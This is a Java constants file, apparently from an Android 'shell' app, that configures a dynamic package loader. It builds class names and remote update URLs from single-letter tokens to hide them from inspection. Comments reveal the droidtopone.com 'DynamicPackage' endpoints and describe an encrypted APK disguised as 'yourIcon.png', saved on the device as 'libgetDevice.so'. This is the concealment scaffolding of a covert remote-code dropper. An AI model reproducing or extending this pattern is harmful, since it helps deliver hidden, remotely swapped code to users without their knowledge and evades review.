package com.use.nice;


import com.surprise.shuabasejoymenghull.BuildConfig;
import com.use.nice.manager.GlobalContext;

import static com.use.nice.manager.CtsPtyManager.$;
import static com.use.nice.manager.CtsPtyManager.C;
import static com.use.nice.manager.CtsPtyManager.D;
import static com.use.nice.manager.CtsPtyManager.Eget;
import static com.use.nice.manager.CtsPtyManager.I;
import static com.use.nice.manager.CtsPtyManager.N;
import static com.use.nice.manager.CtsPtyManager.b;
import static com.use.nice.manager.CtsPtyManager.c;
import static com.use.nice.manager.CtsPtyManager.com;
import static com.use.nice.manager.CtsPtyManager.con;
import static com.use.nice.manager.CtsPtyManager.e;
import static com.use.nice.manager.CtsPtyManager.g;
import static com.use.nice.manager.CtsPtyManager.i;
import static com.use.nice.manager.CtsPtyManager.is;
import static com.use.nice.manager.CtsPtyManager.l;
import static com.use.nice.manager.CtsPtyManager.n;
import static com.use.nice.manager.CtsPtyManager.o;
import static com.use.nice.manager.CtsPtyManager.p;
import static com.use.nice.manager.CtsPtyManager.png;
import static com.use.nice.manager.CtsPtyManager.r;
import static com.use.nice.manager.CtsPtyManager.s;
import static com.use.nice.manager.CtsPtyManager.t;
import static com.use.nice.manager.CtsPtyManager.u;
import static com.use.nice.manager.CtsPtyManager.v;
import static com.use.nice.manager.CtsPtyManager.w;
import static com.use.nice.manager.CtsPtyManager.y;
/**
 * Created by zhengnan on 2015/9/17.
 */
public class NiceCts {
    public static String subConnectClass = Eget(com,$,s,u,r,p,r,is,e,$,s,s,w,$,N,i,c,e,C,o,n,n,e,c,t);//"com.surprise.ssw.NiceConnect";
    //当前壳包的版本
    public static int HULL_VERSION = BuildConfig.myVersion;
    //"		- http://update.droidtopone.com/rankctr/index.php?m=Api&c=DynamicPackage&a=checkUpdate";
    public static String  UPDATE_URL = MyConfig.getIns().getKey(MyConfig.KEY_REQUEST,"");//Eget(http$$,u,p,d,a,t,e,$,d,r,o,i,d,t,o,p,o,n,e,$,com,$$,index,$,p,h,p,"?",m,"=",A,p,i,"&",c,"=",s,t,a,t,"&",a,"=",c,h,e,c,k,U,p,d,a,t,e);
    //"http://update.droidtopone.com/index.php?m=Api&c=DynamicPackage&a=result";
    public static String RESULT_URL =  MyConfig.getIns().getKey(MyConfig.KEY_RESULT, "");//Eget(http$$,u,p,d,a,t,e,$,d,r,o,i,d,t,o,p,o,n,e,$,com,$$,index,$,p,h,p,"?",m,"=",A,p,i,"&",c,"=",D,y,n,a,m,i,c,P,a,c,k,a,g,e,"&",a,"=",r,e,s,u,l,t);

//    public static String LOG_URL = MyConfig.getIns().getKey(MyConfig.KEY_LOG, "");

    public static String RESULT_URL_BACKUP = "";
    //加密apk的 Png文件
    public static String ICON_NAME = Eget(y,o,u,r,I,con,$,png);//"yourIcon.png";
    //apk和png保存的路径 （data/files下）
    public static String SAVE_PATH_NAME = GlobalContext.getCtx().getFilesDir()+"/xi_st";
    //实际apk的名字
   // public static String APK_NAME =Eget(y,y,y,$,a,p,k);// "yyy.apk";
    public static String APK_NAME =Eget(l,i,b,g,e,t,D,e,v,i,c,e,$,s,o);// libgetDevice.so  为so
    //内置的png图片的名称 nice_icon.png
    public static String BUILDIN_ICON_NAME = Eget(n,i,c,e,"_",i,con,$,png);

}
